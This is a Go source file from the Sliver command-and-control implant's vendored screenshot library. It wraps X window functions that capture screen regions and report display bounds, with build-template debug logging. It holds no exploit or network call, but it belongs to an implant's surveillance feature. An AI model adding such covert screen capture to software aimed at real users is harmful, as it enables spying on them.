package screenshot

import (

	// {{if .Debug}}
	"log"
	// {{else}}{{end}}
	"image"

	"github.com/bishopfox/sliver/sliver/3rdparty/kbinani/screenshot/internal/xwindow"
)

// Capture returns screen capture of specified desktop region.
// x and y represent distance from the upper-left corner of main display.
// Y-axis is downward direction. This means coordinates system is similar to Windows OS.
func Capture(x, y, width, height int) (*image.RGBA, error) {
	// {{if .Debug}}
	log.Printf("Capture()")
	// {{else}}{{end}}
	return xwindow.Capture(x, y, width, height)
}

// NumActiveDisplays returns the number of active displays.
func NumActiveDisplays() int {
	// {{if .Debug}}
	log.Printf("NumActiveDisplays()")
	// {{else}}{{end}}
	return xwindow.NumActiveDisplays()
}

// GetDisplayBounds returns the bounds of displayIndex'th display.
// The main display is displayIndex = 0.
func GetDisplayBounds(displayIndex int) image.Rectangle {
	// {{if .Debug}}
	log.Printf("GetDisplayBounds()")
	// {{else}}{{end}}
	return xwindow.GetDisplayBounds(displayIndex)
}
